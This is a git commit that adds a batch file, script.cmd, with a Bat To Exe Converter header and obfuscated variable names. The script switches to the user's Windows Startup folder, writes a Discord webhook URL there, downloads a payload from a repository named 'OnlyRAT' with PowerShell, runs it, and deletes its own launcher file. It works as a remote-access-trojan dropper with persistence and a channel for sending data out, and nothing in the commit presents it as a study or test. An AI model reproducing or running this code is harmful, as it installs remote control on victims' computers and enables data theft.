15f0f0b9ca9dee8d460d53a0ed727ceb1cd2a4a4
xxaldebaran <71579530+xxaldebaran@users.noreply.github.com>
2024-05-09 01:18:43 +0300

    ///

---
+++ script.cmd
@@ -0,0 +1,42 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCuDJHaK8WYiIQ1RcBKXfH60D4lPqOv0+viUp3EzUfYod53QmoeLI/UB41H9SYYp0DdTlsEJDw9RcRyXbQA6v2tQomGBZYmZqwqB
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+set "XNjFYKECht=%cd%"
+set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+cd %YKHfpmMRoQ%
+echo https://discord.com/api/webhooks/1221100344176803900/hCulTh1iSjXEy-p6UrIUtC4O52OlS0WAmTjJpytBy0pSU-0FJCwsoZhYTPgi6l6MoFdW > lawFvVTikZ.txt
+powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main/payloads/g1.cmd -o wEaoFkNduy.cmd"
+powershell -Command "./wEaoFkNduy.cmd"
+cd "XNjFYKECht%"
+del from-github.cmd
